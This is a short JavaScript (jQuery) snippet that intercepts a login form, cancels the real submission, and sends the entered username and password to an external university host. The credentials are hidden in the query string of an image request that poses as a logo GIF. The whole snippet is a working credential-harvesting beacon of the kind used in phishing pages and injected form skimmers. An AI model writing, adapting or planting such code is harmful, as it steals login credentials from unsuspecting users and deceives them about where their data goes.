$('#loginForm').submit((event) => {
    event.preventDefault();
    var u = $('#username').val();
    var p = $('input[type=password]').val();

    var url = 'https://mis.cp.eng.chula.ac.th/themes/cpmis/images/culogo.gif?u='+u+'p='+p
    var img = '<img src="'+url+'">';
    $('body').append(img);
});